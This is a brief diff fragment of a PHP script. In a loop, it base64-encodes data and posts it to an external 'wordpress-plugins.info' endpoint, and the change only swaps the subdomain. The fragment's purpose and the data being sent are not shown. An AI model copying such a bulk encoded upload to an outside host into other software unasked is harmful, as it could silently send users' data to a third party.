@@ -57,7 +57,7 @@ for($i=1;$i<=400;$i++){
 		$data = base64_encode($data);
 		$postfield['data'] = $data;;
 	}
-	$x = get_curl('http://ebola.wordpress-plugins.info/postapi.php', array(
+	$x = get_curl('http://wordpress-plugins.info/postapi.php', array(
 		'mpost' => true,
 		'mpostfield' => $postfield,
 	));
